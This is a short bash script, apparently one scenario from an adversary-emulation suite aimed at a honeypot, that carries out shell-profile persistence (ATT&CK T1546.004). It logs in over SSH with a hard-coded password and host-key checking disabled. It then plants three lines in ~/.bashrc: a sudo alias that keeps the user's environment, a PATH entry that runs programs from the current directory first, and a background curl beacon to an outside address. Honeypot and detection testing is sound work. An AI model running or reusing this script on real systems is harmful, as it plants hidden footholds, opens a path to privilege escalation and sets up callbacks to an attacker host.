#!/usr/bin/env bash
# S17 — Bashrc / Profile Persistence
# Tactic : Persistence (TA0003)
# Technique: T1546.004 Event Triggered Execution: Unix Shell Configuration Modification
TARGET="${1:-safe-honeypot}"
SSH="sshpass -p admin ssh -o StrictHostKeyChecking=no -o ConnectTimeout=30 ${TARGET} -p 2222"
echo "=== S17 Bashrc Persistence — ${TARGET} ==="
$SSH "echo 'alias sudo=\"sudo -E\"' >> ~/.bashrc; echo 'export PATH=.:$PATH' >> ~/.bashrc; echo 'curl -s http://10.0.0.1/beacon &' >> ~/.bashrc; cat ~/.bashrc | tail -5" && echo "[OK]" || echo "[FAIL]"
